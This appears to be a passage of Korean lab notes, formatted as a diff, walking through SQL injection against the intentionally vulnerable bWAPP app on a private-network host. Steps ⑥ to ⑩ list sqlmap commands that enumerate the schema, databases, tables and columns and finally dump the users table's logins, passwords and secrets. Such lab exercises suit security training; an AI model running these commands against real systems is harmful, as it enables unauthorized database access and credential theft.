@@ -1,0 +1,36 @@
+ 4) 'sqlmap'를 이용한 SQL 인젝션
+
+ ⑥ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_16.php" \
+--cookie="쿠키 정보" \
+--data "login=abcd&password=1234&form=submit" --schema
+
+
+ ⑦ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_16.php" \
+--cookie="쿠키 정보" \
+--data "movie=1&action=go" --dbs 
+
+
+ ⑧ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_16.php" \
+--cookie="쿠키 정보" \
+--data "login=abcd&password=1234&form=submit" -D bWAPP --tables 
+
+
+ ⑨ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_16.php" \
+--cookie="쿠키 정보" \
+--data "login=abcd&password=1234&form=submit" -D bWAPP -T users --column
+
+
+ ⑩ 
+
+sqlmap -v 3 -u "http://192.168.20.205/bWAPP/sqli_16.php" \
+--cookie="쿠키 정보" \
+--data "login=abcd&password=1234&form=submit" -D bWAPP -T users -C id,login,password,secret \
+--dump
